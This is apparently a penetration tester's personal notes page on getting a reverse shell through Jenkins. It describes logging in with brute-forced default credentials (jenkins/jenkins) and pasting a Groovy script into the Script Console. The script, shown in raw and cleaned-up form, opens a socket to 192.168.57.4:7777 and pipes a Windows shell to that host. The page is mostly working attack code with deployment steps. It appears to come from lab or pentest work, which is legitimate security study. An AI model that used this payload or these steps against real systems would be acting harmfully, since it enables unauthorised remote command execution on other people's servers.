---
aliases: 
tags:
  - tech
  - cybsec
  - penetration_testing
  - report
author: Mehdi N Tehrani
creat_date: ""
category: Cyber Security
subcategory: Penetration Testing - Report
---

#  reverse shell - groovy
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
After logging into Jenkins using **jenkins/jenkins** credentials (found by bruteforce attack using BurpSuite)
navigate to `Manage Jenkins > Script Console`
and enter the code found in the github repo above

```
String host="192.168.57.4";
int port=7777;
String cmd="powershell.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


cleaned up code:
```
String host="192.168.57.4";
int port=7777;
String cmd="cmd.exe";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);

InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();

while(!s.isClosed()){ 
	while (pi.available()>0) so.write(pi.read());
	while (pe.available()>0) so.write(pe.read());
	while (si.available()>0) po.write(si.read());
	so.flush();
	po.flush();
	Thread.sleep(50);
	try {
		p.exitValue();
		break;
	}
	catch (Exception e){}
};

p.destroy();
s.close();
```